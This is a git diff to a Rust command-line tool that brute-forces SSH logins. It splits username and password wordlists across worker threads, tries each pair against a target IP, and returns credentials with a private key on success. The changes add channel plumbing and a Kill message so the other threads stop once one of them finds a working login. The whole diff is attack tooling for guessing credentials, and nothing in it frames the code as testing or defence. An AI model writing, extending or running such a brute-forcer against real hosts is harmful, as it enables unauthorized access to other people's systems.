@@ -210,9 +210,11 @@ impl Arguments {
     }
 
     else {
-      
+      // Splits each line in the username and password files into separate array/vector chunks.
       let users: Vec<&str> = usr_content.split(u_ln).collect();
       let passwords: Vec<&str> = pwr_content.split(p_ln).collect();
+      
+      // variables will be passed to thread and username&passwords will be joined to each other.
       let mut userpass: Vec<String> = Default::default();
       let key_info = KeyInfo { bits: bits.clone(), algo: algo.clone(), ip: ip.clone() };
 
@@ -222,6 +224,7 @@ impl Arguments {
         }
       }
 
+      // Gets the number of lines, items assigned to each thread, and the remainder if the number is odd.
       let items = userpass.len();
       let thread_chunk_sz = items/threads as usize;
       let remainder = items as f64 % threads as f64;
@@ -230,13 +233,19 @@ impl Arguments {
       println!("items: {}\nthread_chunk_size: {}\nremainder: {}\n {threads}",
       style(items).cyan(), style(thread_chunk_sz).cyan(), style(remainder).cyan());
     
-      let (tx_msg, rx_msg) = unbounded::<ThreadMessage>();
+      // Sets up the channel receiver and senders to send and receives message between threads.
+      let (tx_msg_in, rx_msg_in) = unbounded::<ThreadMessage>();
+      let (tx_msg_out, rx_msg_out) = unbounded::<ThreadMessage>();
       let (tx_out, rx_out) = unbounded::<KeyOutput>();
+      
+      // Stores the usernames and passwords + the chunk size to be passed to each thread.
       let mut th_data_ch: Vec<String> = Default::default();
       let mut ch_counter: usize = 0;
       
       for i in 0..userpass.len()+1 {
-        let th_msg_sender = tx_msg.clone();
+        // Creates clones of each item so the reference is not lost in each iteration of the loop.
+        let th_msg_sender_in = tx_msg_in.clone();     // Sends messages to the main thread.
+        let th_msg_recv_out = rx_msg_out.clone();   // Sends messages to the worker threads.
         let th_out_sender = tx_out.clone();
         let th_key_info = key_info.clone();
 
@@ -250,13 +259,17 @@ impl Arguments {
           // Brute force private key login.
           // Call thread function and userpass chunk to thread.
           handles.push(thread::spawn(move || {
-            let th_msg_s = th_msg_sender.clone();
+
+            // clone every item and give the worker thread a copy.
+            let th_msg_s_i = th_msg_sender_in.clone();
+            let th_msg_r_o = th_msg_recv_out.clone();
             let th_out_s = th_out_sender.clone();
             let th_data_chk = c_data.len();
             let th_ip = cip.clone();
             println!("thread_chunk {th_data_chk}\nthread_chk_data: {:?}", c_data);
 
-            if let Some(buffer) = Self::thread_populate_buffer(th_msg_s.clone(), c_data, &th_key_info) {
+            // Brute force the login and retrive the private key.
+            if let Some(buffer) = Self::thread_populate_buffer(th_msg_s_i.clone(), th_msg_r_o.clone(), c_data, &th_key_info) {
               let output = KeyOutput {
                 algorithim: format!("{:?}", algo),
                 bits: bits.clone(),
@@ -268,7 +281,8 @@ impl Arguments {
                 data: buffer,
               };
 
-              match th_msg_s.send(ThreadMessage::Data) {
+              // Message is sent when the thread is ready to send the private key to the main thread.
+              match th_msg_s_i.send(ThreadMessage::Data) {
                 Ok(_) => {
                   if let Err(e) = th_out_s.send(output) {
                     println!("{}: unable to send keydata to main thread - {}", style("Error").red().bright(), style(e).cyan());
@@ -279,7 +293,7 @@ impl Arguments {
                   }
                 },
 
-                Err(e) => {}
+                Err(_) => {}
               }
             }
           }));
@@ -300,14 +314,17 @@ impl Arguments {
       let mut wait_counter: usize = 0;
 
       loop {
+        let crx_msg_in = rx_msg_in.clone();
+        let ctx_msg_out = tx_msg_out.clone();
+        let crx_out = rx_out.clone();
+
         if wait_counter >= 10 {
           break;
         }
         
-        let crx_msg = rx_msg.clone();
-        let crx_out = rx_out.clone();
-
-        if let Ok(v) = crx_msg.recv() {
+        // Main thread goes through endless loop until the data is ready to be received.
+        // Main thread then sends a message to kill all worker threads.
+        if let Ok(v) = crx_msg_in.recv() {
           
           match v {
             ThreadMessage::Data => {
@@ -317,9 +334,16 @@ impl Arguments {
                 println!("{}: keydata received", style("OK").yellow().bright());
                 out = s;
               }
+
+              if let Ok(_) = ctx_msg_out.send(ThreadMessage::Kill) {
+                println!("{}: killing threads", style("OK").yellow().bright());
+              }
+
+              break;
             }
 
             ThreadMessage::Waiting => {}
+            ThreadMessage::Kill => {}
           }
         }
 
@@ -331,7 +355,7 @@ impl Arguments {
       }
       
       for i in handles {
-        if let Ok(handle) = i.join() {
+        if let Ok(_) = i.join() {
           println!("handles joined: {handle_count}");
           handle_count += 1;
         }
@@ -341,13 +365,33 @@ impl Arguments {
     out
   }
 
-  pub fn thread_populate_buffer(s_msg: Sender<ThreadMessage>, data: Vec<String>, info: &KeyInfo) -> Option<PrivateKeyData> {
+  /**Function is similar to populate_output_buffer in that it also brute forces ssh logins. However this function is designed to send and receiver messages
+   * to and from a worker thread to the main thread. The only data that is returns from this function is the usernames, password and private key.
+   * Params:
+   *  s_msg: Sender<ThreadMessage>    {Sends messages to the main thread}
+   *  r_msg: Receiver<ThreadMessage>  {Receives messages from the main thread}
+   *  data:  Vec<String>              {Data to be parsed from the username and password files}
+   *  info:  &KeyInfo                 {Information about the private key to be created}
+   * Returns Option<PrivateKey>
+   */
+  pub fn thread_populate_buffer(s_msg: Sender<ThreadMessage>, r_msg: Receiver<ThreadMessage>, data: Vec<String>, info: &KeyInfo) -> Option<PrivateKeyData> {
     let c_data = data.clone();
     let key_type = info.algo;
     let bits = info.bits;
     let ip = String::from(info.ip.as_str());
 
     for i in c_data {
+      println!("thread for");
+      let cr_msg = r_msg.clone();
+
+      if let Ok(r) = cr_msg.recv_timeout(Duration::from_millis(50)) {
+        match r {
+          ThreadMessage::Kill => { return None; }
+          ThreadMessage::Waiting => {}
+          ThreadMessage::Data => {}
+        }  
+      }
+
       let pair: Vec<&str> = i.split(":").collect();
       let username = pair[0];
       let password = pair[1];
@@ -378,7 +422,7 @@ impl Arguments {
         Err(e) => {
           // debug messages go here --->
 
-          if let Err(e) = s_msg.send(ThreadMessage::Waiting) {
+          if let Err(_) = s_msg.send(ThreadMessage::Waiting) {
 
           }
         }
@@ -458,7 +502,7 @@ impl Arguments {
 }
 
 pub mod types {
-  use osshkeys::{cipher::Cipher, KeyType};
+  use osshkeys::KeyType;
   use serde::Serialize;
   use clap;
 
@@ -490,6 +534,7 @@ pub mod types {
   pub enum ThreadMessage {
     Data,
     Waiting,
+    Kill,
   }
   
   #[derive(Debug, Clone, clap::ValueEnum)]
